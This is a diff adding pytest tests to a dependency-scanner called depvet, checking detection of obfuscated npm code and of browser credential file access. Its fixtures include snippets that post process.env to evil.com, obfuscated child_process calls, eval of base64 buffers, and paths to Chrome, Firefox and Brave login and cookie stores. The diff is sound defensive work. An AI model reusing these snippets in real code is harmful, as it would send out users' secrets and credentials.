@@ -142,7 +142,168 @@ class TestNativeBindingInjection:
 # ─── Pattern count ────────────────────────────────────────────────────────
 
 
+# ─── CJS/npm obfuscation patterns ────────────────────────────────────────
+
+
+class TestCJSRequireConcat:
+    def test_require_string_concat(self):
+        diff = make_diff(
+            ["const cp = require('ch' + 'ild_pr' + 'ocess');"],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_REQUIRE_CONCAT" for r in m)
+
+    def test_no_false_positive_normal_require(self):
+        diff = make_diff(["const fs = require('fs');"], "index.js")
+        m = scan_diff_full(diff)
+        assert not any(r.rule_id == "CJS_REQUIRE_CONCAT" for r in m)
+
+
+class TestCJSCharCodeBuild:
+    def test_fromcharcode_multiple_args(self):
+        diff = make_diff(
+            ["String.fromCharCode(72, 101, 108, 108, 111)"],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_CHARCODE_BUILD" for r in m)
+
+    def test_short_charcode_not_triggered(self):
+        """Single arg should not trigger (too few digits in sequence)."""
+        diff = make_diff(["String.fromCharCode(65)"], "index.js")
+        m = scan_diff_full(diff)
+        assert not any(r.rule_id == "CJS_CHARCODE_BUILD" for r in m)
+
+
+class TestCJSHexEscape:
+    def test_require_hex_escape(self):
+        diff = make_diff(
+            [r"require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73')"],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_HEX_ESCAPE" for r in m)
+
+    def test_eval_unicode_escape(self):
+        diff = make_diff(
+            [r"eval('\u0063\u006f\u006e\u0073\u006f\u006c\u0065')"],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_HEX_ESCAPE" for r in m)
+
+
+class TestCJSNewFunction:
+    def test_new_function_constructor(self):
+        diff = make_diff(
+            ["""new Function('return this.constructor("return this")()')"""],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_NEW_FUNCTION" for r in m)
+
+    def test_new_function_backtick(self):
+        diff = make_diff(
+            ["new Function(`return process.env`)"],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_NEW_FUNCTION" for r in m)
+
+
+class TestCJSEnvExfil:
+    def test_process_env_with_fetch(self):
+        diff = make_diff(
+            [
+                "const data = JSON.stringify(process.env);",
+                "fetch('https://evil.com/collect', {method: 'POST', body: data});",
+            ],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_ENV_EXFIL" for r in m)
+
+    def test_process_env_with_https_request(self):
+        diff = make_diff(
+            [
+                "const env = process.env;",
+                "https.request({host: 'evil.com', path: '/api'}, (res) => {}).write(JSON.stringify(env));",
+            ],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_ENV_EXFIL" for r in m)
+
+
+class TestCJSChildProcessObfuscated:
+    def test_bracket_notation(self):
+        diff = make_diff(
+            ["""require('child_process')['exec']('whoami')"""],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_CHILD_PROCESS_OBFUSCATED" for r in m)
+
+
+class TestCJSEvalBuffer:
+    def test_eval_buffer_from(self):
+        diff = make_diff(
+            ["eval(Buffer.from('Y29uc29sZS5sb2coImhpIik=', 'base64').toString())"],
+            "index.js",
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "CJS_EVAL_BUFFER" for r in m)
+
+
+# ─── Browser credential access ──────────────────────────────────────────
+
+
+class TestBrowserCredentialAccess:
+    def test_chrome_login_data(self):
+        """Pattern requires BOTH credential path AND browser name."""
+        diff = make_diff(
+            [
+                "path = os.path.join(home, 'Login Data', 'chrome')",
+            ]
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "BROWSER_CREDENTIAL_ACCESS" for r in m)
+
+    def test_firefox_logins_json(self):
+        """Pattern requires BOTH credential path AND browser name."""
+        diff = make_diff(
+            [
+                "path = os.path.join('logins.json', 'firefox')",
+            ]
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "BROWSER_CREDENTIAL_ACCESS" for r in m)
+
+    def test_brave_cookies(self):
+        diff = make_diff(
+            [
+                "cookies_path = os.path.join(home, 'Cookies', 'brave')",
+            ]
+        )
+        m = scan_diff_full(diff)
+        assert any(r.rule_id == "BROWSER_CREDENTIAL_ACCESS" for r in m)
+
+
+# ─── Pattern count ────────────────────────────────────────────────────────
+
+
 def test_total_patterns_at_least_35():
     from depvet.analyzer.rules import MALICIOUS_PATTERNS
 
     assert len(MALICIOUS_PATTERNS) >= 35
+
+
+def test_extended_patterns_all_registered():
+    """All extended patterns should be in the global MALICIOUS_PATTERNS."""
+    from depvet.analyzer.extended_rules import EXTENDED_PATTERNS
+    from depvet.analyzer.rules import MALICIOUS_PATTERNS
+
+    ext_ids = {p["id"] for p in EXTENDED_PATTERNS}
+    main_ids = {p["id"] for p in MALICIOUS_PATTERNS}
+    assert ext_ids.issubset(main_ids), f"Missing: {ext_ids - main_ids}"
